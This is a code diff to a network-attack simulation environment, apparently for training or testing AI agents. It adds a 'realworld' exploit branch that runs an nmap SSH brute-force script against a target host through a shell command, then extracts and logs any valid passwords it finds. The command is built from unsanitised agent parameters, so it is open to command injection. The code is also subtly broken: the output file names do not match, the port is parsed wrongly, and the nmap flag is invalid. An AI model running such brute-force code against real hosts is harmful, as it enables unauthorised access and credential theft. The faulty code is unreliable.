@@ -890,34 +890,95 @@ class NetworkSecurityEnvironment(object):
             else:
                 logger.info(f"\t\t\t Invalid source_host:'{action.parameters['source_host']}'")
         elif action.type == components.ActionType.ExploitService:
-            # We don't check if the target is a known_host because it can be a blind attempt to attack
-            logger.info(f"\t\tAttempting to ExploitService in '{action.parameters['target_host']}':'{action.parameters['target_service']}'")
-            if "source_host" in action.parameters.keys() and action.parameters["source_host"] in current.controlled_hosts:
-                if action.parameters["target_host"] in self._ip_to_hostname: #is it existing IP?
-                    logger.info("\t\t\tValid host")
-                    if self._ip_to_hostname[action.parameters["target_host"]] in self._services: #does it have any services?
-                        if action.parameters["target_service"] in self._services[self._ip_to_hostname[action.parameters["target_host"]]]: #does it have the service in question?
-                            if action.parameters["target_host"] in next_known_services: #does the agent know about any services this host have?
-                                if action.parameters["target_service"] in next_known_services[action.parameters["target_host"]]:
-                                    logger.info("\t\t\tValid service")
-                                    if action.parameters["target_host"] not in next_controlled_hosts:
-                                        next_controlled_hosts.add(action.parameters["target_host"])
-                                        logger.info("\t\tAdding to controlled_hosts")
-                                    new_networks = self._get_networks_from_host(action.parameters["target_host"])
-                                    logger.info(f"\t\t\tFound {len(new_networks)}: {new_networks}")
-                                    next_known_networks = next_known_networks.union(new_networks)
+            if action.type == components.ActionType.ExploitService and action_type == 'netsecenv':
+                # We don't check if the target is a known_host because it can be a blind attempt to attack
+                logger.info(f"\t\tAttempting to ExploitService in '{action.parameters['target_host']}':'{action.parameters['target_service']}'")
+                if "source_host" in action.parameters.keys() and action.parameters["source_host"] in current.controlled_hosts:
+                    if action.parameters["target_host"] in self._ip_to_hostname: #is it existing IP?
+                        logger.info("\t\t\tValid host")
+                        if self._ip_to_hostname[action.parameters["target_host"]] in self._services: #does it have any services?
+                            if action.parameters["target_service"] in self._services[self._ip_to_hostname[action.parameters["target_host"]]]: #does it have the service in question?
+                                if action.parameters["target_host"] in next_known_services: #does the agent know about any services this host have?
+                                    if action.parameters["target_service"] in next_known_services[action.parameters["target_host"]]:
+                                        logger.info("\t\t\tValid service")
+                                        if action.parameters["target_host"] not in next_controlled_hosts:
+                                            next_controlled_hosts.add(action.parameters["target_host"])
+                                            logger.info("\t\tAdding to controlled_hosts")
+                                        new_networks = self._get_networks_from_host(action.parameters["target_host"])
+                                        logger.info(f"\t\t\tFound {len(new_networks)}: {new_networks}")
+                                        next_known_networks = next_known_networks.union(new_networks)
+                                    else:
+                                        logger.info("\t\t\tCan not exploit. Agent does not know about target host selected service")
                                 else:
-                                    logger.info("\t\t\tCan not exploit. Agent does not know about target host selected service")
+                                    logger.info("\t\t\tCan not exploit. Agent does not know about target host having any service")
                             else:
-                                logger.info("\t\t\tCan not exploit. Agent does not know about target host having any service")
+                                logger.info("\t\t\tCan not exploit. Target host does not the service that was attempted.")
                         else:
-                            logger.info("\t\t\tCan not exploit. Target host does not the service that was attempted.")
+                            logger.info("\t\t\tCan not exploit. Target host does not have any services.")
                     else:
-                        logger.info("\t\t\tCan not exploit. Target host does not have any services.")
+                        logger.info("\t\t\tCan not exploit. Target host does not exist.")
                 else:
-                    logger.info("\t\t\tCan not exploit. Target host does not exist.")
-            else:
-                logger.info(f"\t\t\t Invalid source_host:'{action.parameters['source_host']}'")
+                    logger.info(f"\t\t\t Invalid source_host:'{action.parameters['source_host']}'")
+            elif action.type == components.ActionType.ExploitService and action_type=='realworld':
+                logger.info(f"\t\tAttempting to ExploitService in '{action.parameters['target_host']}':'{action.parameters['target_service']}' in the real world")
+                if "source_host" in action.parameters.keys() and action.parameters["source_host"] in current.controlled_hosts:
+                    if action.parameters["target_host"] in self._ip_to_hostname: #is it existing IP?
+                        logger.info("\t\t\tValid host")
+                        if self._ip_to_hostname[action.parameters["target_host"]] in self._services: #does it have any services?
+                            if action.parameters["target_service"] in self._services[self._ip_to_hostname[action.parameters["target_host"]]]: #does it have the service in question?
+                                if action.parameters["target_host"] in next_known_services: #does the agent know about any services this host have?
+                                    if action.parameters["target_service"] in next_known_services[action.parameters["target_host"]]:
+                                        logger.info("\t\t\tValid service")
+                                        if action.parameters["target_host"] not in next_controlled_hosts:
+                                            # Here do the attack
+                                            logger.info(f"\t\tExploiting host {action.parameters['target_host']} {action.parameters['target_service']} in real world.")
+                                            nmap_file_xml = 'nmap-result.xml'
+                                            port = action.parameters['target_host'].split('/')[0]
+                                            command = f"nmap -o PubkeyAuthentication=no -sT -p {port} {action.parameters['target_host']} -v -n --script ssh-brute --script-args userdb=users,passdb=pass,brute.firstonly=true -oX test-nmap.xml"
+                                            result = subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True, text=True)
+                                            # We ignore the result variable for now
+                                            # Parse the XML file
+                                            tree = ET.parse(nmap_file_xml)
+                                            root = tree.getroot()
+                                            new_credentials = set()
+
+                                            # Find the relevant script element
+                                            script = root.find('.//script[@id="ssh-brute"]')
+
+                                            # Extract username and password if they are valid
+                                            if script is not None:
+                                                for table in script.findall('.//table[@key="Accounts"]/table'):
+                                                    username = table.find('.//elem[@key="username"]').text
+                                                    password = table.find('.//elem[@key="password"]').text
+                                                    state = table.find('.//elem[@key="state"]').text
+
+                                                    if state == 'Valid credentials':
+                                                        logger.info(f"\t\t\tValid credentials found:\nUsername: {username}\nPassword: {password}")
+                                                        # Since we got credentials, add to controlled hosts
+                                                        next_controlled_hosts.add(action.parameters["target_host"])
+                                                        logger.info("\t\tAdding to controlled_hosts")
+                                            else:
+                                                logger.info("\t\t\tNo valid credentials found.")
+                                        # This for now it is not implemented, since we didnt connected to obtain the other networks
+                                        # TODO
+                                        #new_networks = self._get_networks_from_host(action.parameters["target_host"])
+                                        #logger.info(f"\t\t\tFound {len(new_networks)}: {new_networks}")
+                                        #next_known_networks = next_known_networks.union(new_networks)
+                                    else:
+                                        logger.info("\t\t\tCan not exploit. Agent does not know about target host selected service")
+                                else:
+                                    logger.info("\t\t\tCan not exploit. Agent does not know about target host having any service")
+                            else:
+                                logger.info("\t\t\tCan not exploit. Target host does not the service that was attempted.")
+                        else:
+                            logger.info("\t\t\tCan not exploit. Target host does not have any services.")
+                    else:
+                        logger.info("\t\t\tCan not exploit. Target host does not exist.")
+                else:
+                    logger.info(f"\t\t\t Invalid source_host:'{action.parameters['source_host']}'")
+
+
+
         elif action.type == components.ActionType.ExfiltrateData:
             logger.info(f"\t\tAttempting to Exfiltrate {action.parameters['data']} from {action.parameters['source_host']} to {action.parameters['target_host']}")
             # Is the target host controlled?
